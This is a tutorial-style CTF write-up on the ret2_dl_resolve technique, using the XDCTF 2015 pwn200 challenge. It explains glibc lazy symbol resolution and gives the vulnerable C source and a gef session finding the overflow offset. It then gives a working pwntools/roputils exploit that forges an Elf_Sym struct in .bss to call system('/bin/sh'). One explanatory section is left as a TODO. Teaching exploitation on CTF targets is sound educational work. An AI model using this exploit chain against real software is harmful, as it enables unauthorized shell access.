# ret2_dl_resolve

## Main idea
For optimization purposes, even though there is a GOT entry for every dynamically linked libc function, they are only resolved on runtime the first time they are called, using `_dl_runtime_resolve`. 

It will be called in the form `_dl_runtime_resolve(link_map, reloc_arg)`, where `link_map` is a global constant and `reloc_arg` is the offset from the start of the `.rel.plt` section. The `Elf_Sym` struct found at that offset will contain a string which is the name of the function, which is used by `_dl_fixup`, which is called by `_dl_runtime_resolve`, to obtain an address to the function in libc, then inserted into the GOT table for future usage.

### So what?
The existence of such a subroutine allows us to "resolve" our own libc functions, such as `system`, if we can craft our own `Elf_Sym` struct that can trick `_dl_runtime_resolve` into resolving the libc address of `system` for us. 

The success of this lies strongly on 2 properties:
* `dl_fixup` does not verify `reloc_arg`
* The resolution depends on the `st_name` member variable in the `Elf_Sym` struct.

### When to use this?
* When we cannot get a leak (for example, there is no write function)
* Same conditions for normal ROP applies, NX and ASLR
* Possibly cannot PIE and canary since we cannot get a leak
* When we don't know the libc version

### Exploit steps
1) Craft a `Elf_Sym` struct that contains the name of the function we want to resolve.
2) Populate registers or stack with arguments for that function
3) Call `_dl_runtime_resolve` with `reloc_arg` being the offset of our fake struct from `.rel.plt`.

## What does \_dl_runtime_resolve do actually?
```
// TODO: write this part
```

## Example - XDCTF 2015 pwn200
### Code
```
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln()
{
	char buf[100];
	setbuf(stdin, buf);
	read(0, buf, 256);
}
int main()
{
	char buf[100] = "Welcome to XDCTF2015~!\n";

	setbuf(stdout, buf);
	write(1, buf, strlen(buf));
	vuln();
	return 0;
}
```

Compile with no stack protector

`gcc main.c -m32 -fno-stack-protector -o main`

### Exploit
[roputils](https://github.com/inaz2/roputils) makes it very easy to perform a ret2_dl_resolve  exploit. Just copy roputils.py into the same directory of the exploit script.

First, as usual, we need to find the offset before putting our ROP chain.
```
gef➤  pattern create 200
[+] Generating a pattern of 200 bytes
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
[+] Saved as '$_gef0'
gef➤  r
Starting program: /home/daniel/pwn/ret2dlresolve/xdctf-pwn200 
Welcome to XDCTF2015~!
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

Program received signal SIGSEGV, Segmentation fault.
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]────
$eax   : 0x000000c9
$ebx   : 0x00000000
$ecx   : 0xffffd13c  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$edx   : 0x00000100
$esp   : 0xffffd1b0  →  "eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]"
$ebp   : 0x62616163 ("caab"?)
$esi   : 0xf7f9e000  →  0x001d4d6c ("lM"?)
$edi   : 0xffffd220  →  0xffffd240  →  0x00000001
$eip   : 0x62616164 ("daab"?)
$eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$es: 0x002b  $cs: 0x0023  $ds: 0x002b  $fs: 0x0000  $ss: 0x002b  $gs: 0x0063  
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────
0xffffd1b0│+0x00: "eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]"	 ← $esp
0xffffd1b4│+0x04: "faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra[...]"
0xffffd1b8│+0x08: "gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsa[...]"
0xffffd1bc│+0x0c: "haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta[...]"
0xffffd1c0│+0x10: "iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabua[...]"
0xffffd1c4│+0x14: "jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva[...]"
0xffffd1c8│+0x18: "kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwa[...]"
0xffffd1cc│+0x1c: "laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa[...]"
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────
[!] Cannot disassemble from $PC
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ threads ]────
[#0] Id 1, Name: "xdctf-pwn200", stopped, reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x62616164 in ?? ()
gef➤  pattern search 0x62616164
[+] Searching '0x62616164'
[+] Found at offset 112 (little-endian search) likely
```

The offset is 112. Prepare our script with pwntools and roputils.

```
from roputils import *
from pwn import process

binary = 'xdctf-pwn200'
r = process(binary)

rop = ROP(binary)
```

To use ret2_dl_resolve, we need to know `reloc_arg`, which means we need to know the address of our fake struct. We can craft it inside `.bss`. We can achieve so by making a call to `read`. 

After `read`, we can use `dl_resolve_call(base, args*)` which will prepare all the necessary arguments to make a call to `_dl_resolve_runtime`, where `base` is the address of our fake struct and `args` are the arguements we want to pass to the function.

```
bss_base = rop.section('.bss')

buf = rop.fill(offset)
buf += rop.call('read', 0, bss_base, 100)
# after using read to construct our symtab in .bss + 20, we use dl_resolve to call it
buf += rop.dl_resolve_call(bss_base + 20, bss_base)
r.send(buf)
```

Our final goal is to be able to call `system('/bin/sh')`. Early we specified `args` to be `bss_base`, so we can put our string `'/bin/sh'` there first. Then at `bss_base + 20`, we can craft a fake struct which will be resolved to `system`.

```
# over here we just fill in .bss with the data we need
buf = rop.string('/bin/sh')
buf += rop.fill(20, buf)
buf += rop.dl_resolve_data(bss_base + 20, 'system')
r.send(buf)
```

Now, we should be able to get a shell.
```
r.interactive()
```


## Relevant source code
* [\_dl_runtime_resolve](https://github.com/nush-osi-layer-8/glibc/blob/c4ad5782c44f4fa23d3ca9bec1e288c24cf2e6df/sysdeps/x86_64/dl-trampoline.h#L65)
* [dl_fixup](https://github.com/nush-osi-layer-8/glibc/blob/master/elf/dl-runtime.c#L61)
* [reloc_arg is also reloc_offset](https://github.com/nush-osi-layer-8/glibc/blob/master/elf/dl-runtime.c#L46)
* [Elf_Dyn structs](https://github.com/nush-osi-layer-8/glibc/blob/c4ad5782c44f4fa23d3ca9bec1e288c24cf2e6df/elf/elf.h#L817)
* [Elf_Sym structs](https://github.com/nush-osi-layer-8/glibc/blob/c4ad5782c44f4fa23d3ca9bec1e288c24cf2e6df/elf/elf.h#L516)

## References
* https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/advanced_rop/#_1
* http://pwn4.fun/2016/11/09/Return-to-dl-resolve/

As you can see they are all in chinese, so I rewrote this in English. There are writeups in English but they just describe the exploit without actually explaining the internal details.